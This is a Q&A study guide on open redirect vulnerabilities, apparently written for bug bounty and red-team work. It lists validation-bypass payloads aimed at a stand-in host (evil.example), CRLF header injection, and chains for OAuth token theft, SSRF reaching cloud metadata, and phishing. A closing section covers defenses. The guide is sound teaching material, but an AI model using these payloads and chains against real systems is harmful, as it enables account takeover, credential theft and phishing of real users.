# Open Redirect — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **Open Redirect (Unvalidated Redirects & Forwards)** — from "what
> is a redirect" to the chains that actually pay: **OAuth/SSO `code`/`token` theft → account takeover**, **`javascript:`
> in a client sink → DOM-XSS**, **redirect-on-allowed-host → SSRF allow-list bypass**, **CRLF/response splitting**, and
> **credible phishing on a trusted origin**. Q&A format, progressive difficulty. Covers sinks, sources, every validation
> bypass (`//`, `\`, `@`, whitelist, encoding, unicode, CRLF), exploitation, tooling, methodology, real-world patterns,
> **and** defense.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, and your own labs. Use your **own marker
> host**, prove chains with your **own accounts**, catch your **own token**, take PoC pages down, and never redirect real
> users or test systems you lack written permission to test.

**Canonical references** (cited throughout — real and worth reading):
- PortSwigger Web Security Academy — *DOM-based open redirection* & *OAuth authentication* (`redirect_uri`)
- OWASP — *Unvalidated Redirects and Forwards* Cheat Sheet + WSTG *Testing for Client-side URL Redirect* (WSTG-CLNT-04)
- PayloadsAllTheThings — *Open Redirect* · HackTricks — *Open Redirect*
- CWE-601 (URL Redirection to Untrusted Site) · CWE-79 · CWE-918 · CWE-113
- Companion kit in this repo: `Web/OpenRedirect/` (guide + arsenal + checklist + report template + `poc/`); siblings `Web/OAuth/`, `Web/SSRF/`, `Web/HostHeader/`, `Web/XSS/`, `Web/SubdomainTakeover/`.

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals (what/where/why)** (Q1–Q12)
- **Level 1 — Recon & baseline** (Q13–Q24)
- **Level 2 — Sinks & bypasses** (Q25–Q46)
- **Level 3 — Exploitation by impact (ATO, XSS, SSRF)** (Q47–Q68)
- **Level 4 — Advanced chains & CRLF** (Q69–Q80)
- **Tooling** (Q81–Q85)
- **Black-box methodology & checklist** (Q86–Q90)
- **Cheat sheets** (Q91–Q95)
- **Real-world patterns & references** (Q96–Q98)
- **Defense — secure redirects** (Q99–Q102)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is an open redirect in one breath?
The app takes a **URL/host/path from the client** and uses it to send the browser somewhere — an HTTP `Location` header, an HTML `<meta refresh>`, or a JavaScript `location =` — without restricting the destination to its own origin. So an attacker chooses where a `target.com` link lands the victim.

### Q2. Why is it in the same family as SSRF and OAuth `redirect_uri` bugs?
All three are "trusting a client-controlled URL." The difference is **who follows it**: in an **open redirect the *browser* follows** it; in **SSRF the *server* fetches** it; the **OAuth `redirect_uri`** bug is a redirect that *is* validated but validated wrongly. Knowing which one you have decides the exploit and the severity.

### Q3. What are the three redirect sinks?
`Location` **response header** (a 30x), HTML **meta-refresh** (`<meta http-equiv="refresh" content="0;url=...">`), and **JavaScript** (`location=`, `location.href`, `.assign()`, `.replace()`, `window.open()`, anchor `href`). The JS sink is the highest-value because it can execute `javascript:` → **DOM-XSS**.

### Q4. Where does the untrusted URL usually come from?
A query param — `next`, `returnUrl`, `redirect`, `redirect_uri`, `url`, `dest`, `continue`, `goto`, `return_to`, `callback`, `image_url` — or a POST field (login `returnUrl`, SAML `RelayState`), a path segment (`/out/<url>`), or the URL **fragment** read by client JS (a pure DOM redirect that never touches the server).

### Q5. Is a bare open redirect High severity?
No. On its own it's **Low–Medium** — a phishing enabler. It becomes **High–Critical** only when something rides along (an OAuth `code`/`token`, a reset/session token) or a control gives way (SSRF allow-list, WAF host check, `javascript:` scheme → XSS). Report the chain, not the hop.

### Q6. So why does the class matter at all if bare = Low?
Because it's the **detonator** for the expensive bugs. The reason `redirect_uri` validation exists in OAuth is that a redirect you control delivers the victim's token to you. An open redirect on an SSRF-allow-listed host walks straight to cloud metadata. A `javascript:` redirect sink is XSS. It's a small bug that unlocks big ones.

### Q7. What's the single most common winning payload?
Protocol-relative: **`//evil.example`**. A validator that only checks "does it start with `/`?" sees a path; the browser sees `//` as a scheme-relative **host** and navigates off-origin. Try it immediately after a plain absolute URL fails.

### Q8. What are the "parser-gap trio"?
`//` (protocol-relative), `\` (backslash — browsers treat it as `/` in the authority, many validators don't), and `@` (userinfo — everything before `@` is username, the real host is after it: `https://target.com@evil.example`). These three exploit the disagreement between what the validator parses and what the browser parses.

### Q9. `javascript:` in a `Location` header — does it XSS?
No. Browsers ignore non-`http(s)` schemes in a `Location` response header. `javascript:` only executes in a **client-side** sink (`location.href = value`, anchor `href`, `window.open`). Mislabeling a `Location`-header `javascript:` as XSS is a classic false positive (guide §16).

### Q10. The server *fetches* my URL and shows me the content. Open redirect?
No — that's **SSRF** (the server, not the browser, follows the URL). Report it as SSRF (usually higher-paying). An open redirect on an *allow-listed* host is the classic way to **bypass an SSRF allow-list** (Q60), but the fetch itself is SSRF, not open redirect.

### Q11. What CWE do I cite?
**CWE-601** (URL Redirection to Untrusted Site — "Open Redirect") is the anchor. Add **CWE-79** (the `javascript:`/DOM-XSS escalation), **CWE-918** (SSRF allow-list bypass), **CWE-113** (CRLF/response splitting), and **CWE-287/384** (auth/session, for the ATO chains). Lead the title with the impact, cite CWE-601 plus the escalation CWE.

### Q12. What's the minimum I need to test open redirect?
Burp or curl to see the raw `Location` without following it (`curl -D - -o /dev/null`), a **host you control** as the redirect target, an understanding of the three sinks, and — for the JS/DOM variant — a real browser + DOM Invader/devtools to trace `location`/`href` sinks. For the OAuth chain, a token-catcher on your marker host.

---

# LEVEL 1 — RECON & BASELINE

### Q13. Where do I find redirect parameters at scale?
Harvest URLs with `gau`/`waybackurls`/`katana`/`hakrawler`, then grep the redirect param name-set (`gf redirect`). Historical URLs are gold — old `?returnUrl=` values reveal params the current site no longer links.

### Q14. How do I find *hidden* redirect params?
Arjun or Param Miner against login, logout, SSO, checkout, "share", "download", and "preview" endpoints. Many redirect params (`returnUrl`, `next`) aren't in any link but are honored if you supply them.

### Q15. Which single endpoint should I test first?
The **login/logout/SSO** flow's `redirect_uri`/`returnUrl`/`RelayState`. It's the most common location *and* the gateway to the OAuth token-theft chain (Q54), the highest-value outcome.

### Q16. How do I tell the sink type quickly?
`curl -s -D - -o /dev/null "<url>"` — if you see a `3xx` + `Location:`, it's the **header** sink. If a `200` with `<meta http-equiv=refresh>` in the body, it's **meta**. If the body has JS reading the param into `location`/`href`, it's the **JS** sink (use a browser / DOM Invader to confirm).

### Q17. What's the baseline probe order?
Cheapest bypass first: `https://evil.example` → `//evil.example` → `/\evil.example` → `https:/\evil.example` → `https://target.com@evil.example` → `https://evil.example/target.com` → `evil.example` (scheme-less). Stop at the first that lands off-origin.

### Q18. How do I confirm it actually left the origin?
Read the raw `Location` (must be your host, not a same-origin path) **or** watch a real browser's address bar land on your host. A `302` to `/dashboard` is same-origin (not a bug); a `302` to `//evil.example` or `https://evil.example` is the bug.

### Q19. The param only accepts paths starting with `/`. Dead end?
Not yet. `//evil.example` and `/\evil.example` both *start with* `/` but are off-origin hosts to the browser. Also try `/%2f%2fevil.example` and `/\/\evil.example`. The leading-`/` check is one of the weakest and most common defenses.

### Q20. It reflects my URL into an `href` but doesn't auto-navigate. Valid?
Yes, but lower auto-severity — it's a **user-interaction** (click) open redirect. Report it (especially if it feeds OAuth/phishing or is `javascript:` → XSS on click), but an **auto-redirect** with no click is stronger.

### Q21. What if the redirect target is a fixed partner I can't change?
Then it's not attacker-controlled — **not a bug** (guide §16 FP #2). Move on unless you can find a payload that steers it to *your* host.

### Q22. How do I know it's worth escalating vs just phishing?
Ask: is there an **OAuth flow** using this host (→ token theft)? Is the sink **client-side JS** (→ `javascript:` XSS)? Is there a **token/session in the URL**? Is there an **SSRF locked to an allowed host** you could bounce? If any, escalate. If none, it's a phishing-grade Medium/Low.

### Q23. Should I test the fragment (`#`)?
Yes — if client JS reads `location.hash`/`location.search` and redirects, that's a **DOM open redirect** that never hits the server (so server-side WAFs/logs miss it). It's also a prime `javascript:`/DOM-XSS candidate.

### Q24. What's the deliverable at the end of recon+baseline?
A list of `(endpoint, param, sink-type)` where at least one produces an **off-origin** redirect (or a validated one you'll bypass), plus a note of which escalation each candidate could feed (OAuth/JS-XSS/SSRF/token-leak/phishing).

---

# LEVEL 2 — SINKS & BYPASSES

### Q25. Why does every bypass come down to a "parser disagreement"?
Because validation and the browser parse the same string. A bypass is any string the **validator reads as safe** (a path / a same-host URL) but the **browser reads as off-origin** (a foreign host). `//`, `\`, `@`, and encoding are the levers that split the two interpretations.

### Q26. Walk me through why `//evil.example` works.
The validator often checks "starts with `/`" or "is a relative path" → `//evil.example` passes (starts with `/`). But per URL spec, `//` begins an **authority** (scheme-relative), so the browser navigates to the host `evil.example`. Disagreement → bug.

### Q27. Why does `\` work in browsers?
Browsers (WHATWG URL) normalize backslashes to forward slashes in the authority for compatibility. So `https:/\evil.example` and `/\evil.example` are treated as `https://evil.example` / `//evil.example` by the browser, while a naive validator sees literal backslashes and doesn't recognize the host.

### Q28. Explain the `@` userinfo bypass.
In `https://target.com@evil.example`, `target.com` is the **userinfo** (username) and `evil.example` is the **host**. A validator doing `startsWith("https://target.com")` passes it; the browser connects to `evil.example`. Add `%40` (encoded `@`) or multiple `@` for validators that decode/split differently.

### Q29. How do I beat a "contains target.com" allow-list?
Put `target.com` somewhere that isn't the host: `https://evil.example/target.com`, `https://evil.example?x=target.com`, `https://evil.example#target.com`, or `https://target.com.evil.example` (target.com is a subdomain label of evil.example). The substring is present; the host is yours.

### Q30. How do I beat a "startsWith https://target.com" allow-list?
`@`-userinfo (`https://target.com@evil.example`), a subdomain prefix (`https://target.com.evil.example`), or a separator trick (`https://target.com\.evil.example`, `https://target.com%2f@evil.example`). The string starts with `target.com` but the effective host is yours.

### Q31. How do I beat a strict host allow-list I can't trick?
Two moves: (1) find an **open redirect on an already-allowed host** and chain it (redirect → redirect), or (2) **own a host inside the allowed zone** — a **subdomain takeover** of `*.target.com` gives you a *whitelisted* redirect origin (cross-ref the Subdomain-Takeover kit). You beat the allow-list by controlling something in it.

### Q32. What encoding tricks beat filters?
Double-encoding (`%252f%252f` beats decode-once filters), control chars (`%09` tab, `%0d%0a` CRLF, `%00` NULL truncation), and mixed encoding (`%2f%5c`). If the filter decodes once and then checks, a double-encoded payload slips through and the browser decodes the rest.

### Q33. What are the unicode/IDN tricks?
Alternative "dot" code points the parser may fold to `.`: `。` (U+3002 ideographic full stop), `｡` (U+FF61), `．` (U+FF0E fullwidth). `http://evil。example` can resolve to `evil.example` in lenient parsers. Also punycode homoglyphs for phishing-grade look-alikes.

### Q34. When is a redirect param also a CRLF injection?
When the param is reflected **into the `Location` response header** and `\r\n` (`%0d%0a`) survives un-neutralized. Then `?next=https://x/%0d%0aSet-Cookie:%20a=b` injects a header → **HTTP response splitting** (CWE-113) → session fixation, a second `Location`, or header-based cache poisoning/XSS.

### Q35. How do I confirm a JS/DOM sink safely?
In a browser with devtools/DOM Invader, trace the param into `location`/`href`/`assign`/`replace`/`window.open`. Then test `javascript:alert(document.domain)` — a benign `alert` proves script execution without exfiltrating anything.

### Q36. What if `javascript:` is filtered?
Bypass the scheme filter: `java%09script:` (tab), `java%0ascript:` (newline), `JaVaScRiPt:` (case), `javascript:javascript:` (nested), `%6a%61%76…` (encoded), or `data:text/html;base64,...`. Filters that do a naive `startsWith("javascript:")` or a single strip fall to these.

### Q37. Does a meta-refresh sink allow `javascript:`?
Usually browsers block `javascript:` in `<meta refresh>`, but `data:text/html` sometimes works, and off-origin `http(s)` always works. Treat meta as an off-origin redirect sink; the `javascript:`→XSS escalation is specific to the JS `location`/`href` sinks.

### Q38. What's the difference between `location.href=` and `location.assign()` for my payload?
Functionally the same for redirect and for `javascript:` execution. `.replace()` also avoids a history entry (stealthier). `window.open(userInput)` opens a new window/tab and likewise executes `javascript:`. All are exploitable sinks — test whichever the code uses.

### Q39. The app strips `https://` from my input. Now what?
Use a scheme-less payload: `//evil.example` or `evil.example` (if the app prepends its own scheme). Stripping the scheme often *creates* a protocol-relative bypass rather than preventing one.

### Q40. How do I test a POST-based redirect (login `returnUrl` hidden field)?
Intercept the login POST in Burp, change the `returnUrl` field to your bypass payload, complete auth, and observe the post-login `Location`. Many apps validate the GET param but trust the POST field.

### Q41. What about redirect *chains* — target → a.com → evil?
If the app allow-lists a set of hosts and one of them (`a.com`) has its own open redirect, point the target at `a.com`'s redirect → it bounces to `evil.example`. You satisfy "the first hop is allowed" while ending up off-origin. This also defeats "the link must start with an allowed host."

### Q42. Can a trailing dot or case change beat a host check?
Sometimes: `https://EVIL.example` (case-insensitive host but case-sensitive validator) or `https://evil.example.` (trailing dot is a valid FQDN the browser accepts but the validator's exact-match rejects/accepts inconsistently). Low-yield but cheap to try.

### Q43. What is "fragment smuggling"?
Putting the real payload after a `#` so a server-side validator (which often ignores/keeps the fragment) sees a benign prefix, but a client that re-parses the URL uses the fragment: `?next=https://target.com#@evil.example` or double-encoded fragment tricks. Useful against mixed server+client validation.

### Q44. How do I prove a bypass to a triager convincingly?
Show the **blocked** attempt (`?next=https://evil` → stayed on-origin) *and* the **bypass** (`?next=//evil` → `Location: //evil.example`) side by side. Include the raw `Location` line. This proves the validation exists *and* is defeatable, which is exactly the fix scope.

### Q45. Should I report the bypass technique or just "open redirect"?
Report the impact-led title (guide §20) but **document the bypass payload** in Steps/Evidence — the fix must cover it. A report that says "blocked `https://evil` but `//evil` works" tells the dev their check is insufficient, which is the actionable part.

### Q46. Which bypass should I try first for speed?
`//evil.example` then `https://target.com@evil.example`. Those two catch the large majority of naive validators. If both fail, escalate to backslash, whitelist-append, encoding, and unicode in that order.

---

# LEVEL 3 — EXPLOITATION BY IMPACT

### Q47. What's the highest-value open-redirect outcome?
**OAuth/SSO `code`/`token` theft → account takeover.** The auth flow delivers a secret to a redirect target; steer that target to your host and the secret arrives at you → you log in as the victim. This is why the class matters (Q54–Q57).

### Q48. How does `javascript:` in a redirect sink become DOM-XSS?
If the client code does `location.href = params.get('url')` and you set `?url=javascript:alert(document.domain)`, the browser executes the script in the `target.com` origin → **DOM-XSS**. Now you can read `document.cookie`, call authenticated endpoints, and steal the session → hand off to the XSS kit for weaponization.

### Q49. Why is DOM-XSS via redirect a tier above the redirect itself?
Because a redirect just moves the browser; XSS **runs your code in the victim's authenticated session on the target origin** — session/token theft, CSRF-token exfil, account actions. Severity jumps from Low–Medium (redirect) to **High** (XSS → ATO).

### Q50. How do I weaponize the DOM-XSS safely for a PoC?
Use `alert(document.domain)` (proves origin) or a benign `console.log`/DOM marker. Don't exfiltrate real data. Note in the report that it *could* read the session — you don't need to actually steal a real user's to prove impact.

### Q51. Walk the SSRF allow-list bypass end to end.
(1) You have an SSRF sink that only fetches allow-listed hosts (e.g. `*.target.com`). (2) You find an open redirect on an allowed host: `https://img.target.com/proxy?url=http://169.254.169.254/...`. (3) You point the SSRF at that allowed URL. (4) The server fetches `img.target.com` (passes the allow-list), gets a `302` to `169.254.169.254`, and — if it follows redirects — fetches the **metadata** endpoint → IAM creds → **Critical**.

### Q52. What's the catch with the SSRF bounce?
The server-side fetcher must **follow redirects** (many HTTP clients do by default). If it doesn't, use a protocol-relative payload or DNS-rebinding instead. Confirm follow-behavior first with a benign OOB host.

### Q53. Is the SSRF bounce reported as open redirect or SSRF?
As **SSRF** (that's where the impact is — internal/metadata reach). The open redirect is the **allow-list-bypass component**. Cross-ref the SSRF kit for metadata/gopher exploitation; this kit owns *finding the redirect that unlocks the allow-list*.

### Q54. Explain the OAuth "open redirect defeats strict `redirect_uri`" chain (chain B).
The IdP enforces an exact `redirect_uri` allow-list you can't beat directly. But the allowed client host (`client.target.com`) has an open redirect. You set `redirect_uri=https://client.target.com/out?url=//evil.example`. The IdP validates `client.target.com` (allowed), sends the `code`/`token` there, and the open redirect **bounces it — with the code in the URL/fragment — to your host**. You just used an open redirect to steal the token past a strict allow-list.

### Q55. Why does the `code` end up in my URL on the bounce?
OAuth appends `?code=...` (or `#access_token=...` in implicit) to the redirect target. When that target 30x-bounces to your host preserving the query/fragment (or a JS sink reads and forwards it), the secret rides along. A fragment-preserving bounce is key for implicit-flow `access_token`.

### Q56. How do I catch the token safely?
Run the flow with **your own** test account and point the final hop at **your marker host** running `poc/token_catcher.py` (a benign listener that logs `code`/`token`/fragment). Exchange **your own** captured `code` to confirm you're authenticated as your own test victim → ATO proven. Never capture a real user's.

### Q57. Is an open redirect on an OAuth client host ever "just Low"?
No. If the host participates in an OAuth flow, its open redirect is a **token-theft primitive** → High–Critical. Always check whether the redirecting host is an OAuth client before down-scoring it.

### Q58. What non-OAuth tokens leak via redirect?
Reset/verify tokens (a reset flow that redirects to a client-controlled URL with the token still in it), legacy session-in-URL (`?sid=`/`jsessionid`), CSRF tokens, and API keys placed in URLs. Any secret in a URL that then redirects off-origin (or links off-origin, leaking via `Referer`) is stealable.

### Q59. How does a `Referer` leak work?
If a page holds a secret in its own URL (e.g. `/reset?token=abc`) and then links/redirects to your host, the browser sends `Referer: https://target.com/reset?token=abc` to you — unless a strict `Referrer-Policy` blocks it. You read the token from your logs → ATO. Check the site's `Referrer-Policy` (absent/`unsafe-url` = leak).

### Q60. If there's no token and no SSRF, is it worthless?
No — it's a **phishing** finding (Medium, context-dependent): a genuine `target.com` link that auto-redirects to your look-alike has high click-through and evades URL-reputation filters (the first hop is a trusted domain). Report it honestly as Medium with a realistic credential-theft narrative; don't inflate to Critical.

### Q61. Can an open redirect escalate via a sister subdomain?
Yes — bounce to a same-parent-domain host that has XSS. Because domain-scoped cookies are shared, XSS on `sister.target.com` reached via the redirect can steal `target.com` cookies. The redirect is the reach; the sister XSS is the payload.

### Q62. How do open redirects abuse enterprise "trusted URL" / conditional-access checks?
Some SSO/conditional-access systems allow-list "trusted" URLs; an open redirect on a trusted host lets an attacker send users through the trusted URL onward to an attacker page, bypassing the "only trusted URLs" control. Relevant for red-team phishing against enterprise logins.

### Q63. What interaction does each impact need?
DOM-XSS and OAuth token-theft: a single click on a crafted `target.com` link (auto-redirect after). SSRF bounce: no victim at all (attacker → SSRF sink). Phishing: one click. Auto-redirect (no click) is strongest; an anchor the victim must click is weaker.

### Q64. Does the redirect need the victim logged in?
For OAuth token-theft and token/session leaks: yes (the secret is generated during the victim's authenticated flow). For SSRF bounce: no. For phishing: no (you're harvesting fresh creds). Note the precondition in the report.

### Q65. How do I demonstrate ATO without touching a real account?
Use **two of your own** accounts (attacker + victim) or one test account playing victim. Run the full flow against yourself, catch your own token, exchange it, and show you're now authenticated as your own "victim." Triagers accept own-account ATO proof.

### Q66. Can an open redirect bypass a WAF?
If a WAF or app allow-lists a callback/host and a redirect on that host reaches a blocked destination, yes — the redirect launders the request through the trusted host. More commonly the redirect is the SSRF allow-list bypass (Q51).

### Q67. What's the "so what" sentence for each variant?
OAuth: "an attacker takes over any account by capturing the OAuth token via the redirect." XSS: "an attacker executes script in the target.com origin (session theft)." SSRF: "an attacker reaches cloud-metadata IAM credentials." Phishing: "a genuine target.com link lands victims on an attacker page." Put one of these in the report's Impact.

### Q68. When do I stop escalating?
Once you've proven the highest-impact chain that exists safely (caught your own token / fired a benign XSS / read metadata read-only). Don't weaponize further, don't harvest real users, don't leave a phishing page live. Prove it, capture evidence, take it down (guide §19).

---

# LEVEL 4 — ADVANCED CHAINS & CRLF

### Q69. Give the full CRLF/response-splitting escalation.
Redirect param reflected into `Location` + surviving `%0d%0a` → inject headers: `Set-Cookie` (session fixation — pin a known session on the victim), a second `Location` (override), `Content-Length`/body-splitting (header-based XSS in some parsers), or cache-poisoning headers. CWE-113; cross-ref Host-Header & Request-Smuggling kits.

### Q70. How does CRLF → session fixation lead to ATO?
Inject `Set-Cookie: session=<attacker-known-value>` via the redirect. The victim's browser stores it; when they log in, the app may bind auth to that fixed session → you already know the session ID → account access. Requires the app to not rotate the session on login.

### Q71. What is a "double redirect" laundering chain for phishing?
`target.com/out?url=allowed-partner.com/redirect?next=//evil.example` — two hops, both starting on trusted hosts, ending on yours. Defeats "the destination must be an allowed host" because each hop's *immediate* destination is allowed. Great click-through, bad for defenders.

### Q72. Can open redirect help defeat SameSite cookie protections?
Indirectly — landing the victim on an attacker page *via a top-level navigation from the trusted origin* can satisfy some SameSite/`Lax` navigation conditions that a cross-site POST wouldn't, aiding a follow-on CSRF or token-relay. It's a supporting hop, not a standalone SameSite bypass.

### Q73. How does open redirect interact with CSP?
An open redirect on an allow-listed host can help satisfy a CSP `report-uri`/`connect-src`/`form-action` that trusts that host, or move script/data through a trusted origin. Usually a component in a larger CSP-bypass chain, not the whole bug.

### Q74. What is a DOM open redirect and why is it sneaky?
Client JS reads `location.hash`/`location.search` and assigns it to `location`/`href` with no server involvement. The payload lives after `#`, so it **never reaches the server** — server WAFs, logs, and validation don't see it. Test in-browser; it's also the top `javascript:`/DOM-XSS candidate.

### Q75. How do I find DOM open redirects at scale?
Burp DOM Invader, or grep the site's JS for source→sink flows: sources `location.hash`/`location.search`/`document.URL`/`document.referrer` → sinks `location=`/`location.href`/`.assign(`/`.replace(`/`window.open(`. Also linkfinder/JSFiles-kit techniques to pull all JS first.

### Q76. Can a redirect leak an OAuth `state` or PKCE value?
If `state`/`code_verifier` end up in a URL that redirects off-origin, yes — leaking `state` enables CSRF/login-CSRF on the OAuth flow, and a leaked `code_verifier` breaks PKCE. More often the leak is the `code`/`token` (Q54). Cross-ref the OAuth kit for the full parameter set.

### Q77. What's the interplay with subdomain takeover?
A taken-over `*.target.com` subdomain is a **whitelisted redirect origin** and a **whitelisted OAuth `redirect_uri`/cookie scope**. It lets you satisfy strict "must be `*.target.com`" allow-lists with a host you fully control → redirect/token-theft on demand. Cross-ref the Subdomain-Takeover kit (they're natural chain partners).

### Q78. How can open redirect amplify an SSRF to RCE?
SSRF-allow-list bypass → internal admin/service with a code-exec feature, or cloud metadata → IAM creds → cloud run-command → shell. The open redirect is the reach; the internal target's capability is the RCE. Cross-ref the SSRF kit §13.

### Q79. What's the stealthiest sink for red-team use?
`location.replace()` (no browser-history entry) or a fragment-based DOM redirect (server never logs the payload). For phishing infra, the trusted-domain first hop is the point — it beats URL-reputation and email filters.

### Q80. Give a realistic full chain from a single link.
`https://target.com/login?next=https://client.target.com/out?url=//evil.example`, sent to a victim → they log in via SSO → IdP validates `client.target.com` → the open redirect bounces the OAuth `code` to `evil.example` → `token_catcher.py` logs it → you exchange the `code` → you're logged in as the victim. One click, full ATO, all riding on a "just an open redirect."

---

# TOOLING

### Q81. What does `poc/openredir_fuzz.py` do?
Sprays the bypass matrix at a `FUZZ`-marked param, follows/reads the `Location` (and scans meta/JS for the marker), and flags any payload that sends the browser to your `--evil` host — **control-baselined** (it first checks the app's normal redirect behavior to cut false positives). It classifies the sink and points you to the right escalation.

### Q82. What does `poc/redirect_payloads.py` do?
Generates the full, deduplicated bypass payload matrix for a given `--target` and `--evil`, ready to paste into Burp Intruder or pipe to `qsreplace`/`httpx`. It's the Arsenal, parameterized.

### Q83. What does `poc/token_catcher.py` do?
A benign local HTTP listener that logs any `code`/`token`/`access_token`/fragment delivered to your marker host — for **own-account** OAuth/token-theft PoCs. It only records to prove the chain; it doesn't act on the token.

### Q84. What existing tools complement the kit?
`gau`/`waybackurls`/`katana`/`hakrawler` (harvest), `gf redirect` (grep params), `qsreplace` + `httpx -location` (bulk test), Arjun/Param Miner (hidden params), Burp DOM Invader (JS sinks), Nuclei (`-tags redirect`), and the OAuth/SSRF kits for the chains.

### Q85. How do I bulk-test off-origin at scale from the CLI?
`gau target.com | gf redirect | qsreplace '//evil.example' | httpx -silent -location -mc 301,302,303,307,308 | grep evil.example`. Any line that echoes `evil.example` in the `Location` is a candidate to verify by hand.

---

# BLACK-BOX METHODOLOGY & CHECKLIST

### Q86. Give the 5-phase method in one paragraph.
**Recon** every redirect param/sink (login/SSO first) → **baseline** off-origin (`//evil` early) → **bypass** validation (parser-gap trio → whitelist → encoding/CRLF) → **escalate** (OAuth token / `javascript:` XSS / SSRF bounce / token leak / phishing) → **validate & report** impact-first with own-host/own-token PoC.

### Q87. What's the one FP that gets reports closed?
Reporting a **same-origin** redirect (`?next=/dashboard`) or a **bare** off-origin redirect as High/Critical. The first isn't a bug; the second is Low–Medium. Always either find the escalation or file it honestly as a phishing-grade Medium.

### Q88. How do I avoid mislabeling SSRF as open redirect?
Ask "who follows the URL?" If the **server** fetches and returns content, it's SSRF (report as SSRF). If the **browser** navigates (30x/meta/JS), it's open redirect. The open-redirect-on-allowed-host is the SSRF *bypass*, but the fetch is SSRF.

### Q89. What must be in the PoC before I submit?
The crafted `target.com` link (realistic delivery), the raw `Location`/rendered sink proving off-origin, and the **escalation artifact** (caught own-token / fired benign XSS / internal metadata read). For a phishing-only finding, the auto-redirect to your page + an honest narrative.

### Q90. How do I set severity honestly?
OAuth token-theft/SSRF-metadata → High–Critical; DOM-XSS/CRLF/token-leak → High; credible auto-redirect phishing → Medium; bare click-through redirect → Low. Map to CVSS and cite CWE-601 plus the escalation CWE.

---

# CHEAT SHEETS

### Q91. Fastest bypass shortlist?
```
//evil.example
/\evil.example
https:/\evil.example
https://target.com@evil.example
https://evil.example/target.com
%2f%2fevil.example
http://evil。example        (unicode dot)
javascript:alert(document.domain)   (JS sink → XSS)
```

### Q92. Redirect param name shortlist?
`next, returnUrl, redirect, redirect_uri, url, dest, continue, goto, return_to, callback, r, u, to, out, image_url`.

### Q93. Confirm-off-origin one-liner?
`curl -s -D - -o /dev/null "https://target.com/login?next=//evil.example" | grep -i '^location:'` → must show `Location: //evil.example`.

### Q94. Impact-to-CWE map?
```
bare redirect / phishing        → CWE-601
javascript:/DOM sink → XSS      → CWE-79 (+601)
SSRF allow-list bypass          → CWE-918 (+601)
CRLF / response splitting       → CWE-113 (+601)
OAuth token-theft → ATO         → CWE-287/384 (+601)
```

### Q95. Decision-in-one-line?
Off-origin? → JS sink→XSS · OAuth host→token theft · SSRF-allow-list→bounce · token-in-URL→leak · else→phishing. Blocked? → `//`,`\`,`@`, whitelist-own-a-host, encode/CRLF. Server fetches? → it's SSRF.

---

# REAL-WORLD PATTERNS & REFERENCES

### Q96. What are the classic real-world open-redirect patterns?
Login `returnUrl`/`next` with a leading-`/` check beaten by `//`; OAuth `redirect_uri` with substring validation; a `/out?url=` outbound-link handler with no validation; a JS SPA reading `?url=`/`#url=` into `location.href` (DOM redirect + `javascript:` XSS); and reset/verify "continue to" links leaking tokens via `Referer`.

### Q97. Which references should I actually read?
PortSwigger *DOM-based open redirection* and *OAuth* labs; OWASP *Unvalidated Redirects and Forwards* Cheat Sheet; PayloadsAllTheThings *Open Redirect*; and disclosed HackerOne reports for "open redirect → OAuth token", "open redirect to XSS", and "open redirect SSRF bypass".

### Q98. What are the most valuable disclosed-report search terms?
`open redirect account takeover`, `redirect_uri bypass token theft`, `//evil.com bypass`, `open redirect to XSS javascript:`, `open redirect SSRF metadata`, `CRLF injection Location header`.

---

# DEFENSE — SECURE REDIRECTS

### Q99. What's the single best fix?
Don't build redirects from client input at all — use a **server-side map**: the client sends a short opaque key (`?next=42`), the server looks up the known-good URL. No user URL ever reaches the redirect → the class is eliminated.

### Q100. If I must accept a user-supplied target, how do I validate it?
Enforce it's a **relative path**: reject anything containing a scheme, `//`, `\`, `@`, or a host. Better, **parse** the URL and compare the **parsed host** against an exact allow-list (never a substring/`startsWith` check), after canonicalization. Reject non-`http(s)` schemes outright.

### Q101. How do I stop the escalations specifically?
Deny `javascript:`/`data:` in client sinks (validate scheme before assigning to `location`/`href`); use **exact-match pre-registered** OAuth `redirect_uri` and don't host open redirects on client hosts; for server-side fetchers, **don't follow redirects** to non-allow-listed hosts; neutralize `\r\n` in any value reflected into headers (CRLF); set a strict `Referrer-Policy` (`strict-origin-when-cross-origin` or `no-referrer`).

### Q102. What's the residual risk after fixing the redirect param?
Subdomain takeovers (a controlled `*.target.com` becomes a "whitelisted" redirect — cross-ref that kit), open redirects on partner/vendor hosts still in an allow-list, and DOM redirects in third-party JS. Redirect hygiene is app-wide, not per-param — audit every sink and keep the allow-list of external hosts minimal and exact.

---

> **The one rule that pays:** an open redirect is only a headline when something rides along (an OAuth `code`/`token`, a
> reset/session token) or a control gives way (SSRF allow-list, `javascript:` → XSS, CRLF). Beat the validator with the
> parser-gap trio (`//`, `\`, `@`) or beat the allow-list by *owning a host inside it*. Prove the **ATO / XSS / SSRF**
> with your own host, own account, own token — then report the impact, not the hop.
